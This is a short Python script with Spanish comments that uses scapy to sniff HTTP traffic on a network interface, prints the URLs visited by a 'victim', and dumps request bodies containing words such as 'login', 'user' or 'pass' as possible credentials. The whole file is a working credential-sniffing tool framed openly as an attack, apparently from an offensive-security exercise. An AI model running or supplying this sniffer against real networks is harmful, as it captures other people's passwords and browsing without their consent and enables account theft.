#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal, sys

def def_handler(sig, frame):
    print(colored("[!] Saliendo...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):

    cred_keywords = ["login", "user", "pass", "mail"]

    if packet.haslayer(http.HTTPRequest): # Para interceptar solo paquetes HTTP

        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode() # Mediante las capas correspondientes (Host, Path) saber el dominio completo de la victima
        print(colored(f"\n[+] URL visitada por la victima:  {url}", "blue"))

        if packet.haslayer(scapy.Raw): # Aqui filtra solo por las peticiones que tengan la capa Raw en ellas
            try:
                response = packet[scapy.Raw].load.decode() # Aqui extrae el contenido de la capa Raw

                for keyword in cred_keywords: # Aqui filtramos por palabras clave para imprimir posibles credenciales
                    if keyword in response:
                        print(colored(f"[+] Posibles Credenciales: {response}\n", "green"))
                        break
            except:
                pass


def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    sniff("ens33")

if __name__ == '__main__':
    main()
